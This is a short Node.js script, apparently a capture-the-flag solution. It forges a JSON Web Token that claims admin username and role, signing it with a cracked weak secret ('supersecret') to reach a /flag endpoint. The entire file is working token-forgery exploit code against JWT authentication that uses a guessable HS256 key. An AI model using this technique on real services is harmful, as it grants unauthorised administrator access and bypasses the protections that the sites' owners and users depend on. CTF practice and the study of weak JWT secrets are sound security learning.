// we cracked the sign so now we are creating our own jwt token to get into the /flag endpoint with this token to get flag
const jwt = require("jsonwebtoken");


const SECRET_KEY = "supersecret"; // The weak secret key

// Create a forged admin token using HS256
const forgedToken = jwt.sign({ username: "admin", role: "admin" }, SECRET_KEY, { algorithm: "HS256" });


console.log("Forged Admin Token:", forgedToken);

